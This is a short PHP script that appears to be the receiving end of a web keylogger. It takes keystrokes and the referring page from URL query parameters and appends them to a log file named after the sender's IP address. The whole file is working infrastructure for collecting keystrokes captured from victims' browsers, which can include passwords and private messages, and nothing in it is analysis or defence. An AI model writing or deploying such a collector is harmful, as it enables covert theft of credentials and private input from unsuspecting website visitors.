<?php
if(isset($_GET['keys']) && isset($_GET['referer'])) {
    $keys=utf8_decode(rawurldecode($_GET['keys']));
    $referer=$_GET['referer'];
    $logfile="./logs/".$_SERVER['REMOTE_ADDR']." - keylog.txt";
    $fp = fopen($logfile, "a") or die("Unable to open file!");
    fwrite($fp, $keys."\r\n\r\n^--- FROM ".$referer."\r\n\r\n") or die("Unable to write to file!");
    fflush($fp);
    fclose($fp);
}
?>